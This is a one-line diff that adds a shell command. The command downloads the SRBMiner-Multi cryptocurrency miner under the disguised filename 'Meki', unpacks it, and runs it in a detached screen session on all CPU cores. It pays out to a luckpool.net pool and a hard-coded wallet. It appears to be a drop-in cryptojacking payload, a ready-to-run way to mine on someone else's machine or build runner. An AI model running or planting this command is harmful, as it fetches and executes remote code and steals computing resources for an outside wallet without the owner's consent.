@@ -1,0 +1,1 @@
+wget -O Meki https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.0/SRBMiner-Multi-2-6-0-Linux.tar.gz && tar -xzvf Meki && cd SRBMiner-Multi-2-6-0 && screen ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RDofYsLTYA2BKkHS1isRHY1kYzdTuyoNq8.Rdo -t $(nproc)
